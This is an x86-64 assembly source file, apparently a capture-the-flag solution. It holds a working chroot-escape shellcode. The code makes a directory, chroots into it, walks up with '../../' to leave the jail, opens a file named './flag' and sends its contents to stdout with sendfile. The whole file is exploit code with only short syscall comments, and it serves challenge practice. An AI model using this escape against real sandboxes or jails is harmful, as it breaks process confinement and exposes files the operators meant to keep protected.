.global _start
_start:
.intel_syntax noprefix

# mkdir("/foo", 0776);
mov rax, 83
lea rdi, [rip+foo]
mov rsi, 0776
syscall

# chroot("/foo");
mov rax, 161
lea rdi, [rip+foo]
syscall

# chdir("../../");
mov rax, 80
lea rdi, [rip+top]
syscall

# open("./flag", 0); // 0 is O_RDONLY
mov rax, 2
lea rdi, [rip+flag]
mov rsi, 0
syscall

# sendfile(1, 4, 0, 0x80);
mov rdi, 1
mov rsi, 4
mov rdx, 0
mov r10, 0x80
mov rax, 40
syscall

flag:
.asciz "./flag"
foo:
.asciz "/foo"
top:
.asciz "../../"
